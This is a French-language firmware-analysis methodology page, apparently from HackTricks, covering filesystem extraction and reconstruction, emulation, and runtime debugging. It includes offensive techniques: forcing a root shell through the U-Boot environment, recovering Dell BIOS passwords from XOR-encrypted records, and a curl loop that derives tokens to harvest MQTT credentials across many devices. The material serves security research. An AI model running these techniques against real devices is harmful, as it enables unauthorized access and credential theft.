# Analyse du firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introduction**

### Ressources associées

Pour récupérer le firmware via des interfaces matérielles exposées, consultez [l’extraction du firmware assistée par une console UART](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) et [l’extraction de la mémoire flash SPI](../hardware-hacking/spi.md#dumping-firmware-from-eeproms).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Le firmware est un logiciel essentiel qui permet aux appareils de fonctionner correctement en gérant et en facilitant la communication entre les composants matériels et les logiciels utilisés par les utilisateurs. Il est stocké dans une mémoire permanente, ce qui permet à l’appareil d’accéder aux instructions essentielles dès sa mise sous tension et de lancer le système d’exploitation. L’examen et la modification éventuelle du firmware constituent une étape importante dans l’identification des vulnérabilités de sécurité.<sup>[[2]](#references)[[3]](#references)</sup>

## **Collecte d’informations**

La **collecte d’informations** est une première étape essentielle pour comprendre la composition d’un appareil et les technologies qu’il utilise. Elle consiste à recueillir des données sur :

- L’architecture du CPU et le système d’exploitation utilisé
- Les spécificités du bootloader
- La disposition du matériel et les fiches techniques
- Les métriques de la base de code et l’emplacement du code source
- Les bibliothèques externes et leurs types de licence
- L’historique des mises à jour et les certifications réglementaires
- Les schémas d’architecture et de flux
- Les évaluations de sécurité et les vulnérabilités identifiées

À cette fin, les outils d’**open-source intelligence (OSINT)** sont précieux, tout comme l’analyse des composants logiciels open source disponibles, réalisée manuellement ou à l’aide de processus automatisés. Des outils comme [Coverity Scan](https://scan.coverity.com) et [LGTM de Semmle](https://lgtm.com/#explore) proposent une analyse statique gratuite permettant de détecter d’éventuels problèmes.

## **Acquisition du firmware**

Il existe plusieurs façons d’obtenir le firmware, chacune présentant un niveau de complexité différent :

- L’obtenir **directement** auprès de la source (développeurs, fabricants)
- Le **compiler** à partir des instructions fournies
- Le **télécharger** depuis les sites d’assistance officiels
- Utiliser des requêtes **Google dork** pour trouver des fichiers de firmware hébergés
- Accéder directement au **stockage cloud**, à l’aide d’outils comme [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercepter les **mises à jour** à l’aide de techniques man-in-the-middle
- L’**extraire** de l’appareil via des connexions telles que **UART**, **JTAG** ou **PICit**
- **Sniffer** les requêtes de mise à jour dans les communications de l’appareil
- Identifier et utiliser les **endpoints de mise à jour codés en dur**
- L’**extraire** du bootloader ou du réseau
- **Retirer et lire** la puce de stockage, en dernier recours, à l’aide du matériel approprié

### Journaux UART uniquement : forcer un shell root via l’environnement U-Boot en flash

Si les données UART RX sont ignorées (journaux uniquement), vous pouvez tout de même forcer le démarrage d’un shell init en **modifiant hors ligne le blob d’environnement U-Boot** :<sup>[[6]](#references)</sup>

1. Extraire la mémoire flash SPI à l’aide d’une pince SOIC-8 et d’un programmateur (3,3 V) :
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Localisez la partition env de U-Boot, modifiez `bootargs` pour inclure `init=/bin/sh`, puis **recalculez le CRC32 de l’env U-Boot** pour le blob.
3. Reflashez uniquement la partition env et redémarrez ; un shell devrait apparaître sur l’UART.

Cette technique est utile sur les appareils embarqués dont le shell du bootloader est désactivé, mais dont la partition env est accessible en écriture via un accès externe à la mémoire flash.

## Analyse du firmware

Maintenant que vous **avez le firmware**, vous devez en extraire des informations pour savoir comment le traiter. Voici différents outils que vous pouvez utiliser :

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Si vous ne trouvez pas grand-chose avec ces outils, vérifiez l’**entropie** de l’image avec `binwalk -E <bin>` ; si elle est faible, l’image n’est probablement pas chiffrée. Si elle est élevée, elle est probablement chiffrée (ou compressée d’une manière ou d’une autre).

Vous pouvez également utiliser ces outils pour extraire les **fichiers intégrés au firmware** :

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) pour examiner le fichier.

### Analyse différentielle de la mémoire flash et magasins de secrets XOR récupérables

Lorsqu’un paramètre du firmware n’a pas de format de stockage documenté, commencez par effectuer plusieurs lectures identiques de la mémoire flash, modifiez **exactement un** paramètre, puis redumpez la puce entière et comparez les offsets. Répéter l’expérience avec des valeurs contrôlées permet de distinguer le paramètre des compteurs et des métadonnées d’écriture ; les modifications à de nouveaux offsets, plutôt qu’en place, indiquent un magasin en ajout seul ou structuré en journal. Conservez les entrées supprimées ou marquées comme obsolètes, car leurs octets de données peuvent rester récupérables.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Après avoir localisé la région, extrayez les modules de firmware avec des outils tels que `binwalk`, puis rétro-ingénieriez le writer/validator dans Ghidra. Confirmez dans le code les limites des champs, le padding, l’indexation des clés et la dérivation des clés, au lieu de déduire le schéma uniquement à partir des motifs du ciphertext.<sup>[[12]](#references)</sup>

#### Récupérer des clés à partir du padding chiffré composé de zéros

Comme expliqué dans [chiffrement basé sur XOR](../../crypto/symmetric/#xor-based-encryption), un texte en clair connu révèle les octets du keystream aux mêmes offsets. Un champ de taille fixe est particulièrement exposé lorsque son padding composé de zéros couvre tous les indices d’une clé XOR répétée : le padding chiffré révèle directement ces octets de clé, car `0x00 XOR key_byte = key_byte`. Si tous les indices de la clé sont couverts, reconstituez la clé à partir de la fin du ciphertext et déchiffrez les octets contenant des données.<sup>[[12]](#references)</sup>

Le format DVAR vulnérable de mot de passe BIOS de Dell en est un exemple concret : l’octet `0` d’un champ de 32 octets est en clair, tandis que les octets `1..31` utilisent une clé répétée de 20 octets.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Pour une longueur de mot de passe `L`, les positions `L..31` étaient à zéro avant le XOR. Lorsque `L <= 12`, ces positions couvrent chaque index de clé, ce qui permet de récupérer la clé complète et le mot de passe sans brute force :<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Extraire les clés des enregistrements historiques

N’analysez pas chaque enregistrement indépendamment. La clé DVAR est dérivée approximativement comme suit : `modified_md5(device_seed || variable_GUID || password[0])` : le device seed et le GUID sont fixes, et le seul élément dépendant du mot de passe est son premier octet en clair. Cela donne au plus 256 clés par appareil, et les enregistrements commençant par le même octet partagent une clé. Regroupez les enregistrements actifs et supprimés selon cet octet ; un court enregistrement historique peut révéler la clé complète grâce au padding et permettre de déchiffrer un enregistrement actuel plus long dont le padding ne suffit pas à lui seul. La rotation du mot de passe peut donc accroître l’exposition si l’ancien texte chiffré est tombstoné plutôt qu’effacé.<sup>[[12]](#references)</sup>

L’outil [`dellpwn`](https://github.com/R3n5k1/dellpwn) localise DVAR, valide les enregistrements candidats, récupère les mots de passe et peut afficher les octets bruts stockés/de clé. Compilez-le à partir d’un checkout et analysez une image flash vérifiée comme suit :<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Pour les parseurs personnalisés, rejetez les faux positifs en vous appuyant sur la structure des enregistrements, les contraintes sur les caractères imprimables, les vérifications du remplissage par zéros, l’entropie de la clé et la cohérence lorsque la clé reboucle. Si des dumps répétés montrent peu de bits inversés par écriture, énumérez les masques observés et classez les corrections selon ces contraintes, mais signalez les caractères ambigus au lieu de présenter un résultat heuristique comme une récupération exacte.<sup>[[12]](#references)</sup>

Les vérificateurs de mots de passe devraient stocker un hachage salé, itéré et à sens unique plutôt qu’un texte chiffré réversible, et les stockages structurés en journal devraient supprimer de manière sécurisée les données secrètes remplacées.<sup>[[12]](#references)</sup>

### Extraction du système de fichiers

Avec les outils précédemment commentés, comme `binwalk -ev <bin>`, vous devriez avoir pu **extraire le système de fichiers**.\
Binwalk l’extrait généralement dans un **dossier portant le nom du type de système de fichiers**, qui est généralement l’un des suivants : squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extraction manuelle du système de fichiers

Parfois, binwalk **n’aura pas l’octet magique du système de fichiers dans ses signatures**. Dans ce cas, utilisez binwalk pour **trouver le décalage du système de fichiers et extraire le système de fichiers compressé** du binaire, puis **extraire manuellement** le système de fichiers selon son type en suivant les étapes ci-dessous.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Exécutez la **commande dd** suivante pour extraire le système de fichiers Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativement, la commande suivante peut également être exécutée.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Pour squashfs (utilisé dans l’exemple ci-dessus)

`$ unsquashfs dir.squashfs`

Les fichiers se trouveront ensuite dans le répertoire "`squashfs-root`".

- Fichiers d’archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Pour les systèmes de fichiers jffs2

`$ jefferson rootfsfile.jffs2`

- Pour les systèmes de fichiers ubifs avec mémoire flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Reconstruire des systèmes de fichiers racine embarqués répartis sur plusieurs segments

Si un dump brut eMMC/SSD contient un en-tête de système de fichiers valide, mais que ses décalages de métadonnées dépassent la taille nominale de la partition, ne le considérez pas immédiatement comme corrompu. Le code de démarrage embarqué peut assembler le véritable périphérique racine à partir de plusieurs plages physiques à l’aide de Device Mapper. L’extraction d’une seule partition GPT ne produit donc que le premier segment.<sup>[[9]](#references)</sup>

#### Examiner l’intégralité de l’image du support

Vérifiez d’abord que l’acquisition est terminée, que la taille est stable et qu’aucun processus d’écriture n’utilise encore l’image. Si le nom de fichier encode une adresse de début et de fin, comparez cette plage au nombre réel d’octets. Récupérez la GPT en mode lecture seule et n’attachez que la plage nécessaire ; **n’exécutez pas `vgchange -ay` sur un volume physique non fiable depuis la station de travail**, car des conflits entre groupes de volumes et des écritures involontaires sont possibles.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Préférez une VM jetable lorsque la logique d’initialisation d’origine ou une pile LVM doit accéder à l’image entière. Les anciens journaux de démarrage d’une partition de démarrage standard sont particulièrement utiles : le bootloader peut avoir consigné les offsets du conteneur propriétaire, la longueur des composants, la sélection du slot, les règles d’alignement et la vérification de signature. Utilisez ces valeurs pour extraire une ligne de commande, un kernel et un initramfs intégrés, puis validez chaque sortie séparément avec `file`, les octets magiques et `binwalk` ; lire jusqu’à la fin du conteneur peut ajouter accidentellement un initrd, un objet ACPI ou une signature au kernel.<sup>[[9]](#references)</sup>

#### Récupérer la cartographie des blocs au démarrage

Extrayez l’initramfs du kernel et rétro-ingénieriez son `/init` ainsi que ses éventuelles bibliothèques de stockage. Dans [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), suivez les références aux chaînes `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` et aux chemins des partitions ; puis suivez le code qui sélectionne le slot A/B actif et construit la table. Pour commencer avec radare2, utilisez `r2 -A init`, `afl`, `pdf @ main` et `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

La cible linéaire mappe des plages consécutives d’un périphérique virtuel sur des plages d’un ou plusieurs périphériques sous-jacents. Une table récupérée à deux segments a généralement cette forme (toutes les positions et longueurs sont exprimées en secteurs de 512 octets) :<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reproduisez exactement l’arithmétique du code machine, y compris la largeur des entiers, les décalages et les conversions d’unités. Par exemple, l’expression suivante arrondit une taille en octets à la frontière inférieure de 4 Kio, puis seulement la convertit en secteurs de 512 octets ; la remplacer par `p4_bytes // 512` décale la zone de fin sélectionnée de `p4_bytes % 4096` lorsque la partition n’est pas alignée sur une page.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Reconstruisez une image d’analyse plate en copiant les plages dans l’ordre du tableau, par blocs de taille limitée, plutôt que de charger tout le dump du média en mémoire. Cela évite également de créer des périphériques mapper côté hôte. Conservez les offsets dérivés de GPT, les nombres de secteurs inversés et la longueur du fichier résultant comme assertions distinctes.<sup>[[9]](#references)</sup>

#### Distinguer la corruption d’une erreur de reconstruction constante

Pour SquashFS, vérifiez la magic `hsqs` et décodez le champ `bytes_used` little-endian de 64 bits à l’offset 40 du superbloc avant d’exécuter `unsquashfs`. Si l’extraction échoue dans plusieurs structures sans rapport entre elles, recherchez dans une large fenêtre autour des positions attendues et exigez des candidats structurels solides : un bloc de métadonnées décompressible, plusieurs entrées de répertoire consécutives valides, des champs d’inode plausibles, un inode racine cohérent avec le nombre d’inodes ou une structure de métadonnées d’intégrité valide. Une seule correspondance de magic ne suffit pas.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Lorsque le même delta signé rend valides des structures indépendantes — par exemple, les métadonnées d’un répertoire et un enregistrement verity — la cause probable est une erreur systématique de début de segment plutôt que des octets manquants. Revenez au calcul inversé et recherchez les restes supprimés, les problèmes de signe, les débordements ou les arrondis aux secteurs/pages avant de tenter de récupérer des orphelins ou de modifier les métadonnées du système de fichiers.<sup>[[9]](#references)</sup>

Enfin, gardez distinctes les limites de protection : les volumes LUKS scellés par TPM protègent la confidentialité des données, tandis qu’un mappage dm-verity signé protège l’intégrité du système de fichiers racine. Un TPM logiciel ne permet pas de récupérer une clé scellée au TPM physique d’origine, et démarrer un SquashFS modifié au moyen d’un init réservé à la recherche qui omet la vérification verity ne falsifie pas sa signature et ne compromet pas dm-verity.<sup>[[9]](#references)</sup>

## Analyse du firmware

Une fois le firmware obtenu, il est essentiel de le disséquer pour comprendre sa structure et ses vulnérabilités potentielles. Ce processus consiste à utiliser divers outils pour analyser et extraire des données utiles de l’image du firmware.

### Outils d’analyse initiale

Un ensemble de commandes est fourni pour l’inspection initiale du fichier binaire (désigné par `<bin>`). Ces commandes permettent d’identifier les types de fichiers, d’extraire des chaînes, d’analyser des données binaires et de comprendre les détails des partitions et des systèmes de fichiers :

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Pour évaluer le niveau de chiffrement de l’image, on vérifie l’**entropie** avec `binwalk -E <bin>`. Une faible entropie suggère une absence de chiffrement, tandis qu’une entropie élevée indique un chiffrement ou une compression possible.

Pour extraire les **fichiers intégrés**, il est recommandé d’utiliser des outils et ressources tels que la documentation **file-data-carving-recovery-tools** et **binvis.io** pour inspecter les fichiers.

### Extraction du système de fichiers

Avec `binwalk -ev <bin>`, on peut généralement extraire le système de fichiers, souvent dans un répertoire nommé d’après son type (par ex., squashfs, ubifs). Cependant, si **binwalk** ne parvient pas à reconnaître le type de système de fichiers en raison de l’absence d’octets magiques, une extraction manuelle est nécessaire. Il faut alors utiliser `binwalk` pour localiser le décalage du système de fichiers, puis la commande `dd` pour en extraire les données :

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Ensuite, selon le type de système de fichiers (p. ex., squashfs, cpio, jffs2, ubifs), différentes commandes sont utilisées pour extraire manuellement le contenu.

### Analyse du système de fichiers

Une fois le système de fichiers extrait, la recherche de failles de sécurité commence. On porte une attention particulière aux daemons réseau non sécurisés, aux identifiants codés en dur, aux endpoints d’API, aux fonctionnalités des serveurs de mise à jour, au code non compilé, aux scripts de démarrage et aux binaires compilés pour une analyse hors ligne.

Les **emplacements clés** et les **éléments** à inspecter comprennent :

- **etc/shadow** et **etc/passwd** pour les identifiants utilisateur
- Les certificats et clés SSL dans **etc/ssl**
- Les fichiers de configuration et les scripts à la recherche de vulnérabilités potentielles
- Les binaires intégrés pour une analyse plus approfondie
- Les serveurs web et binaires courants des appareils IoT

Plusieurs outils aident à découvrir les informations sensibles et les vulnérabilités dans le système de fichiers :

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) et [**Firmwalker**](https://github.com/craigz28/firmwalker) pour rechercher des informations sensibles
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) pour une analyse complète du firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) et [**EMBA**](https://github.com/e-m-b-a/emba) pour l’analyse statique et dynamique

### Contrôles de sécurité des binaires compilés

Le code source et les binaires compilés trouvés dans le système de fichiers doivent être examinés afin de détecter les vulnérabilités. Des outils comme **checksec.sh** pour les binaires Unix et **PESecurity** pour les binaires Windows aident à repérer les binaires non protégés susceptibles d’être exploités.

## Récupération de la configuration cloud et des identifiants MQTT au moyen de tokens d’URL dérivés

De nombreux hubs IoT récupèrent leur configuration propre à chaque appareil depuis un endpoint cloud qui ressemble à ceci :<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Lors de l’analyse du firmware, vous pouvez découvrir que `<token>` est dérivé localement de l’identifiant de l’appareil à l’aide d’un secret codé en dur, par exemple :

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Cette conception permet à quiconque connaît un deviceId et le STATIC_KEY de reconstruire l’URL et de récupérer la configuration cloud, qui révèle souvent des identifiants MQTT en clair et des préfixes de topic.

Procédure pratique :

1) Extraire deviceId des journaux de démarrage UART

- Connectez un adaptateur UART 3.3V (TX/RX/GND) et capturez les journaux :

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Recherchez les lignes qui affichent le modèle d’URL de configuration cloud et l’adresse du broker, par exemple :

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Récupérer STATIC_KEY et l’algorithme du token à partir du firmware

- Charger les binaires dans Ghidra/radare2 et rechercher le chemin de configuration ("/pf/") ou l’utilisation de MD5.
- Confirmer l’algorithme (p. ex., MD5(deviceId||STATIC_KEY)).
- Dériver le token dans Bash et mettre le condensat en majuscules :

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Récupérer la configuration cloud et les identifiants MQTT

- Composez l’URL et récupérez le JSON avec curl ; analysez-le avec jq pour extraire les secrets :

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Abuser du MQTT en clair et des ACL de topics faibles (si présentes)

- Utilisez les identifiants récupérés pour vous abonner aux topics de maintenance et rechercher des événements sensibles :

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Énumérez les ID d’appareils prévisibles (à grande échelle, avec autorisation)

- De nombreux écosystèmes intègrent des octets OUI/produit/type du fournisseur, suivis d’un suffixe séquentiel.
- Vous pouvez parcourir les ID candidats, dériver des tokens et récupérer des configurations par programmation :

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Remarques
- Obtenez toujours une autorisation explicite avant toute énumération à grande échelle.
- Privilégiez l’émulation ou l’analyse statique pour récupérer des secrets sans modifier le matériel cible, lorsque c’est possible.


L’émulation du firmware permet une **analyse dynamique** du fonctionnement d’un appareil ou d’un programme individuel. Cette approche peut se heurter à des dépendances matérielles ou architecturales, mais transférer le système de fichiers racine ou des binaires spécifiques vers un appareil doté d’une architecture et d’une endianness correspondantes, comme un Raspberry Pi, ou vers une machine virtuelle préconfigurée, peut faciliter la poursuite des tests.

### Émulation de binaires individuels

Pour examiner des programmes uniques, il est essentiel d’identifier leur endianness et leur architecture CPU.

#### Exemple avec l’architecture MIPS

Pour émuler un binaire d’architecture MIPS, vous pouvez utiliser la commande :

```bash
file ./squashfs-root/bin/busybox
```

Et pour installer les outils d’émulation nécessaires :

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Pour MIPS (big-endian), `qemu-mips` est utilisé, et pour les binaires little-endian, `qemu-mipsel` est le choix approprié.

#### Émulation de l’architecture ARM

Pour les binaires ARM, le processus est similaire : l’émulateur `qemu-arm` est utilisé.

### Émulation complète du système

Des outils comme [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) et d’autres facilitent l’émulation complète du firmware, en automatisant le processus et en aidant à l’analyse dynamique.

### Reconstruction de systèmes de fichiers root scindés et vérifiés pour l’émulation

Si un superbloc SquashFS est lisible, mais que les décalages des tables d’inodes, de répertoires ou de fragments sont impossibles, ne corrigez pas immédiatement `unsquashfs`. Faites de la rétro-ingénierie du binaire de démarrage initial et reproduisez le graphe des périphériques bloc qu’il crée : les systèmes embarqués peuvent exposer une partition root nominale, mais construire le véritable système de fichiers avec un mapping `dm-linear` qui ajoute des secteurs empruntés à une autre partition. Les vérifications portant uniquement sur le superbloc peuvent réussir alors que tous les blocs de métadonnées suivants sont décalés.<sup>[[11]](#references)</sup>

Reproduisez exactement les calculs arithmétiques du firmware. Identifiez notamment si les longueurs sont exprimées en octets, en secteurs de 512 octets ou en pages de 4 Kio ; reproduisez les décalages et les troncatures dans leur ordre d’origine ; et tenez compte des régions de fin dépendantes de la banque dans les dispositions A/B. Par exemple, `(partition_bytes >> 12) << 3` tronque d’abord à une limite de 4 Kio, puis exprime le résultat en secteurs de 512 octets ; le remplacer par `partition_bytes // 512` peut décaler de quelques kilo-octets l’étendue ajoutée et corrompre toutes les tables SquashFS en aval.<sup>[[11]](#references)</sup>

Voici une procédure de validation utile :<sup>[[11]](#references)</sup>

1. Récupérez le périphérique source, le secteur de départ et la longueur de chaque segment `dm-linear` à partir du binaire de vérification/init.
2. Concaténez ou mappez les étendues sans modifier leur sémantique d’alignement.
3. Si l’extraction échoue toujours, recherchez uniquement dans une petite fenêtre autour de la limite prédite et exigez plusieurs structures de métadonnées valides consécutives, au lieu de vous fier uniquement à un superbloc plausible.
4. Exécutez un `unsquashfs` non modifié sur l’image reconstruite ; la réussite du parcours de tous les répertoires et fragments constitue une preuve plus solide que `unsquashfs -stat`.

#### Remplacement de dm-verity contrôlé par l’analyste

Lorsque l’analyste contrôle le kernel QEMU, l’initramfs et les disques virtuels, un root modifié peut être démarré en remplaçant le PID 1 de vérification du fournisseur par un petit init lié statiquement. Il s’agit d’une **substitution de la chaîne de démarrage en laboratoire**, et non d’une rupture de dm-verity, de sa signature RSA, de Secure Boot ou d’une clé scellée par un TPM.<sup>[[11]](#references)</sup>

L’init de remplacement doit reproduire les étapes opérationnelles du chemin de démarrage d’origine : monter `devtmpfs`, appeler `setsid()`, connecter `/dev/console` aux descripteurs de fichiers 0–2, monter `/proc` et `/sys`, attendre le périphérique bloc fourni, monter en lecture seule le root modifié, détacher les pseudo-systèmes de fichiers de l’ancien root, déplacer le nouveau montage sur `/`, effectuer un `chroot`, puis exécuter avec `execve()` le `/sbin/init` d’origine du firmware. Détacher `/dev`, `/proc` et `/sys` **avant** `MS_MOVE` évite de détacher accidentellement des points de montage appartenant au nouveau root.<sup>[[11]](#references)</sup>

Conservez séparément l’état modifiable du périphérique et le root immuable modifié. Un overlay qcow2 peut préserver l’état LVM du disque d’origine, tandis qu’un second disque virtio en lecture seule fournit le SquashFS modifié :<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Débogage de l’état d’une image hors ligne

Inspectez l’état persistant en dehors de l’invité lorsque des démarrages lents, des scripts de démarrage destructeurs ou des journaux de console peu fiables masquent la défaillance. N’attachez jamais un overlay utilisé par une VM en cours d’exécution ; exposez-le avec `qemu-nbd`, limitez la détection LVM à la partition NBD visée et désactivez le groupe de volumes avant de le déconnecter.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Pour isoler les pannes de manière reproductible, écrivez des fichiers marqueurs horodatés sur un volume inscriptible stable et vérifiez-les hors ligne ; `/dev/kmsg`, les FIFO et les consoles éphémères peuvent produire des faux négatifs à cause de la limitation du débit ou de l’arrêt prématuré du processus. Comparez aussi les interfaces exactes entre les différentes couches avant de modifier du code sans rapport : `uname -r` par rapport à `/lib/modules/`, les fonctionnalités ext4 sur disque par rapport à la configuration du kernel, et la génération de `libGL` de Mesa par rapport à l’ABI du pilote DRI et aux noms de pilotes dérivés du PCI. Un composant peut être présent et même se charger avec `dlopen()` tout en restant inutilisable, car son consommateur attend une ABI différente.<sup>[[11]](#references)</sup>

## Analyse dynamique en pratique

À cette étape, un environnement d’appareil réel ou émulé est utilisé pour l’analyse. Il est essentiel de conserver un accès shell au système d’exploitation et au système de fichiers. L’émulation peut ne pas reproduire parfaitement les interactions matérielles, ce qui nécessite parfois de redémarrer l’émulateur. L’analyse doit examiner à nouveau le système de fichiers, exploiter les pages web et les services réseau exposés, et explorer les vulnérabilités du bootloader. Les tests d’intégrité du firmware sont essentiels pour identifier d’éventuelles vulnérabilités de backdoor.

## Techniques d’analyse à l’exécution

L’analyse à l’exécution consiste à interagir avec un processus ou un binaire dans son environnement opérationnel, à l’aide d’outils comme gdb-multiarch, Frida et Ghidra pour définir des points d’arrêt et détecter des vulnérabilités par fuzzing et d’autres techniques.

Pour les cibles embarquées sans debugger complet, **copiez un `gdbserver` lié statiquement** sur l’appareil et attachez-vous à distance :<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mappage des messages Zigbee / radio-co-processor

Dans les hubs IoT, la pile RF est souvent répartie entre un **MCU radio** et un processus Linux en espace utilisateur. Une méthode utile consiste à cartographier le chemin :<sup>[[8]](#references)</sup>

1. **Trame RF** transmise par voie hertzienne
2. **Analyseur côté contrôleur** sur le MCU radio
3. **Protocole texte série/UART ou TLV** transmis à Linux (par exemple `/dev/tty*`)
4. **Dispatcher d’application** dans le daemon principal
5. **Gestionnaire spécifique au protocole / machine à états**

Cette architecture crée deux cibles de reverse engineering au lieu d’une. Si le contrôleur convertit les trames radio binaires en protocole textuel tel que `Group,Command,arg1,arg2,...`, retrouvez :

- Les **groupes de messages** et les tables de dispatch
- Les messages pouvant provenir du **réseau** plutôt que du contrôleur lui-même
- Les champs discriminateurs exacts **spécifiques au fabricant** (par exemple `manufacturer_code` et `cluster_command` dans Zigbee)
